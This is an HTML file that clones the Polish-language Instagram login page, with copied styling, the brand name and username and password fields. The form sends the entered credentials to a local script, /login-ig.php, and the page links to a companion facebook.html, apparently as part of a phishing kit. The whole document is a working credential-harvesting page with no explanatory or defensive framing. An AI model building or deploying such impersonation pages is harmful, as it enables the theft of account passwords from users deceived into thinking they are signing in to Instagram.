<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Logowanie • Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 50px;
        }
        .main-container { width: 350px; }
        .box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo-text {
            font-family: 'Brush Script MT', cursive; /* Uproszczony zamiennik logo */
            font-size: 45px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            padding: 9px;
            margin-bottom: 6px;
            border-radius: 3px;
            font-size: 12px;
            box-sizing: border-box;
        }
        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            margin: 10px 0;
            cursor: pointer;
        }
        .separator {
            display: flex; align-items: center; color: #8e8e8e; font-size: 13px; margin: 15px 0;
        }
        .separator::before, .separator::after {
            content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px;
        }
        .fb-login { color: #385185; font-weight: 600; text-decoration: none; font-size: 14px; }
        .forgot { font-size: 12px; color: #00376b; display: block; margin-top: 15px; text-decoration: none; }
        .signup-box { font-size: 14px; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="box">
            <div class="logo-text">Instagram</div>
            <form action="/login-ig.php" method="POST">
                <input type="text" name="username" placeholder="Numer telefonu, nazwa użytkownika lub e-mail" required>
                <input type="password" name="password" placeholder="Hasło" required>
                
                <button type="submit" class="login-btn">Zaloguj się</button>
            </form>
            <div class="separator">LUB</div>
            <a href="./facebook.html" class="fb-login">Zaloguj się przez Facebooka</a>
            <a href="#" class="forgot">Nie pamiętasz hasła?</a>
        </div>
        <div class="box signup-box">
            Nie masz konta? <a href="#">Zarejestruj się</a>
        </div>
    </div>
</body>
</html>
